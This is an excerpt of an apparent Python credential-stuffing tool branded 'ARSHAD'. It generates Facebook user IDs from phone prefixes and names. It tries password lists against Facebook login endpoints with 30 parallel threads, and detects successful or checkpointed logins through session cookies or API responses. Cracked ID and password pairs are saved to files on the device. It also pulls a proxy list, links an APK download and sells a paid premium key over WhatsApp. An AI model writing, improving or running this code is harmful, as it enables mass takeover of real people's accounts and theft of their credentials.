...
try:
        ...
        os.system('python cbi.py')
except:pass

try:
	proxy= requests.get('https://github.com/Rashid118/Lion/blob/main/Lion.txt').text
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/ARSHAD_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923422510361&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ARSHAD Sir, I Need To Buy Your Paid ARSHAD PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+'fkeyx')
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python cbi.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ARSHAD:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                ARSHAD.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: Wahid Bux, Altaf Hussain, Rashid Ali, Aijaz Hussain\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: arshad, ali, laghari\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ARSHAD-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ARSHAD=session.cookies.get_dict().keys()
                        if "c_user" in ARSHAD:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ARSHAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ARSHAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ARSHAD:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ARSHAD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARSHAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ARSHAD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARSHAD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [ARSHAD-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/ARSHAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
    ...
    try:
        for ps in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ARSHAD-CP] '+ids+' | '+ps+'\x1b[1;97m')
                open('ARSHAD-CP.txt', 'a').write(ids+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mARSHAD\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
try:
